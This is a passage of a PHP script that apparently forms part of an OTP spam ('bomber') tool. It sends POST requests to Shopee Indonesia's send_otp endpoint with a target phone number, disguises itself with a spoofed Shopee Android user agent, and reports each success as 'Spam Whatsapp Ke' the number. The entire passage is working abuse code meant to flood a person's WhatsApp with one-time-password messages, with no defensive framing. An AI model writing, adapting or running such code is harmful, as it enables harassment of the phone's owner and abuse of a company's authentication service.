...
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://shopee.co.id/api/v2/authentication/send_otp',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_TIMEOUT => 10,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"phone":"'.$nomor.'","method":"whatsapp"}',
  CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json',
    'User-Agent: Shopee Android/2.78.37'
  ),
));
$response = curl_exec($curl);
//echo $response;
$result = fetch_value($response,'"error":"', '"');
if ($result == '') {
  echo color("green"," ".acak(3)." Spam Whatsapp Ke ".$nomor."\n");
} else {
  echo " SHOPEE ".$response."\n";
}
